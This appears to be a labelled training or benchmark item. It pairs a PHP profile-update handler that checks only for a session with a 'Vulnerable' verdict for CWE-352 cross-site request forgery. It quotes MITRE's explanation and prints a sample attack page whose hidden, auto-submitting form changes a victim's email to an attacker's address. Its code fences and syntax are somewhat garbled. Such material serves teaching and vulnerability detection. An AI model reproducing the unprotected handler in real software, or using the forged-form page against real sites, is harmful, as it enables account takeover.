```
	// initiate the session in order to validate sessions
	session_start();
```
//if the session is registered to a valid user then allow update* 
	
	if (! session_is_registered("username")) {
	```
			echo "invalid session detected!";
```
// Redirect user to login page* 
			[...]
			
			exit;}
	
	
	 *// The user session is valid, so process the request* 
	
	
	 *// and update the information* 
	
	update_profile();
	
	function update_profile {
	```
```
// read in the data from $POST and send an update* 
			
			
			 *// to the database* 
			SendUpdateToDatabase($_SESSION['username'], $_POST['email']);
			[...]
			echo "Your profile has been successfully updated.";}


//Result: 
 // Vulnerable (01)
//
//
//
////Issue: CWE-352 - Cross-Site Request Forgery (CSRF)
//
//
//
//URL: https://cwe-api.mitre.org/api/v1/cwe/weakness/352
//

//Source: CWE Mitre
//

//Extra context: 
// This example PHP code attempts to secure the form submission process by validating that the user submitting the form has a valid session. A CSRF attack would not be prevented by this countermeasure because the attacker forges a request through the user's web browser in which a valid session already exists.
 The following HTML is intended to allow a user to update a profile.
 profile.php contains the following code.
// This code may look protected since it checks for a valid session. However, CSRF attacks can be staged from virtually any tag or HTML construct, including image tags, links, embed or object tags, or other attributes that load background images.
// The attacker can then host code that will silently change the username and email address of any user that visits the page while remaining logged in to the target web application. The code might be an innocent-looking web page such as:
// ```
	<SCRIPT>
	function SendAttack () {
		form.email = "attacker@example.com";
```
// send to profile.php* 
		form.submit();}
	</SCRIPT>
	
	<BODY onload="javascript:SendAttack();">
	
	<form action="http://victim.example.com/profile.php" id="form" method="post">
	<input type="hidden" name="firstname" value="Funny">
	<input type="hidden" name="lastname" value="Joke">
	<br/>
	<input type="hidden" name="email">
	</form>
// Notice how the form contains hidden fields, so when it is loaded into the browser, the user will not notice it. Because SendAttack() is defined in the body's onload attribute, it will be automatically called when the victim loads the web page.
// Assuming that the user is already logged in to victim.example.com, profile.php will see that a valid user session has been established, then update the email address to the attacker's own address. At this stage, the user's identity has been compromised, and messages sent through this profile could be sent to the attacker's address.